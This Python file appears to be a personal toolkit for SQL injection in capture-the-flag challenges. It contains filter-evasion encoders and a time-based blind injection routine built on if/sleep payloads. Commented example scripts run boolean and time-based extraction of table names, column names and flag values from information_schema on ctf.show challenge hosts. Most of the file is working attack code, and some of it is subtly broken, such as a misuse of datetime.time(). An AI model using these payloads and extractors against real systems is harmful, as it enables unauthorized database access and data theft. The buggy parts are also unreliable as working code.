import datetime
import requests
from utfc.StrFunc import *
from urllib.parse import quote

Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
Alphex = '0123456789abcdeflg{}-'


class Tamper:
    @staticmethod
    def num2tpi(num):  # 用 true false pi 表示数
        nums = ['(true)', '(true<<true)', '(true<<true<<true)', '(true<<pi())', '(true<<pi()<<true)',
                '(true<<pi()<<true<<true)', '(true<<(pi()<<true))', '(true<<pi()<<pi()<<true)'][::-1]
        x = format(num, '08b')
        ret = '((false)'
        for i in range(len(x)):
            if x[i] == '1':
                ret += '^'
                ret += nums[i]
        return ret + ')'

    @staticmethod
    def num2tpiNgl(num):  # 用 true false pi 表示数 木有<<
        nums = ['(true)', '(true+true)', 'pow(true+true,true+true)', 'pow(true+true,true+true+true)',
                'pow(true+true,ceil(pi()))', 'pow(true+true,ceil(pi()+true))', 'pow(true+true,ceil(pi()+true+true))',
                'pow(true+true,ceil(pi()+true+true+true))'][::-1]
        x = format(num, '08b')
        ret = '((false)'
        for i in range(len(x)):
            if x[i] == '1':
                ret += '+'
                ret += nums[i]
        return ret + ')'


class Tbi:
    @staticmethod
    def Bi_def(url='', target='', len=40, alphabet=None):
        if alphabet == None:
            alphabet = Alphabet
        print('Start')
        result = ''
        for i in range(1, 33):
            for char in alphabet:
                # 设置payload
                payload = ' or if((substr(({}),{},1) regexp "^{}"),sleep(3),1)'.format(target, i, char)
                # 计算响应时长
                start = int(datetime.time())
                r = requests.get(url + quote(payload))
                response_time = int(datetime.time()) - start
                if response_time >= 2:
                    result += char
                    print('-->' + result)
                    break


class sqliPL:
    pl = {'urlp': '', 'data': '', 'cookies': '', 'timeout': 5}

    def getlist(self):
        return [self.pl]


class sqli:
    def __init__(self, URL='', CHK=None, output=True):
        self.out = output
        if not URL.startswith('http'):
            URL = 'http://' + URL
        self.se = requests.session()

        self.url = URL
        if CHK == None:
            self.chk = sqli.chk_nonothing()
        else:
            self.chk = CHK

    @staticmethod
    def chk_nonothing(txt='', code=0):
        return (True, code, txt)

    def get(self, pl: "sqliPL"):
        try:
            resp = self.se.get(self.url + pl.pl['urlp'])
            res = self.chk(resp.text, resp.status_code)
        except:
            res = self.chk('ERR-FROM-TRY\n', 0)
        if self.out:
            print('- ' * 20)
            print(pl.pl['urlp'])
            print('- ' * 40)
            print(res)
        return res

    def post(self, pl: "sqliPL"):
        try:
            resp = self.se.post(self.url + pl.pl['urlp'], data=pl.pl['data'], cookies=pl.pl['cookies'],
                                timeout=pl.pl['timeout'])
            res = self.chk(resp.text, resp.status_code)
        except:
            res = self.chk('ERR-FROM-TRY\n', 0)
        if self.out:
            print('- ' * 20)
            printl(pl.pl)
            print('- ' * 40)
            print(res)
        return res


'''盲注的例子
import requests,json
url='http://0a7dcfc9-1ecb-4f53-8037-0a3073f7d091.chall.ctf.show/api/?id='
def chk(pl):
    data = {
        'username':'\'union({})#'.format(pl),
        'password':'1'
    }
    return '登陆成功' in json.loads(requests.post(url,data=data).text)['msg']
print(chk('select(1=1)'),chk('select(1>1)'))
Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
table=''
def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where table_schema=database()'):
    l=1
    while True:
        print(l,end=',')
        pl_gcd='select + length('+pl+')=%d '%l + plf
        if chk(pl_gcd) : break
        l+=1
    print('\nl=',l)
    ret=''
    for i in range (1,1+l):
        print('\n',format(ret,'%ds'%l),end='')
        for j in Alphabet:
            pl_gnr="select mid({},{},1)='{}' {}".format(pl,i,j,plf)
            print(j,end='')
            if(chk(pl_gnr)):
                ret+=j
                break
    print('\nret=', ret)
    return ret

'''


boolbi = '''--BoolBi:
u=''
def chk(pl=''):
    pl=u.replace('FUCK',pl).replace(' ','/**/')
    return 'Hi admin, your score is: 100' in  requests.get(pl).text


def sqli(pl1="",pl2=""):
    print(chk('1=1'), chk('1=2'))
    l=200
    for i in range(200):
        pl=pl1.format(i)
        print(i,end=' ')
        if chk(pl):
            l=i
            break
    str = ''
    for i in range(1,l+1):
        printbi(i,str,l+5)
        for j in stv.st_codeset.Alphabet:
            pl=pl2.format(i,j)
            print(j,end='')

            if chk(pl):

                str+=j
                break
    print()
    print(str)
pl1='select length(group_concat(table_name))={} from information_schema.tables where table_schema=database()'
pl2='select substr(group_concat(table_name),{},1)="{}" from information_schema.tables where table_schema=database()'
pl1='select length(group_concat(column_name))={}  from information_schema.columns where table_name="flag"'
pl2='select substr(group_concat(column_name),{},1)="{}" from information_schema.columns where table_name="flag"'
pl1='select length(group_concat(value))={}  from flag'
pl2='select substr(group_concat(value),{},1)="{}" from flag'
#sqli(pl1,pl2)
'''

'''
import requests
import time
url='https://9ae21dbb-74b0-499e-b345-ca611e176e10.chall.ctf.show/'
l='iILOVE1abcdefghjkmnlopqrstuvwxyzABCDFGHIJKMNPQRSTUWXYZ234567890'
data2='0x'
for b in range(1,1000):
    for a in l:
        data={"username":"admin\\",
              "password":"or/**/if((left(password,"+str(b)+")/**/regexp/**/binary/**/"+data2+str(hex(ord(a))).replace('0x','')+"),sleep(10),1)#"
              }
        #print(data)
        t1=time.time()
        requests.post(url=url,data=data)
        t2=time.time()
        if t2-t1>10:
            print(a)
            data2+=str(hex(ord(a))).replace('0x','')
            break

print(data)
'''
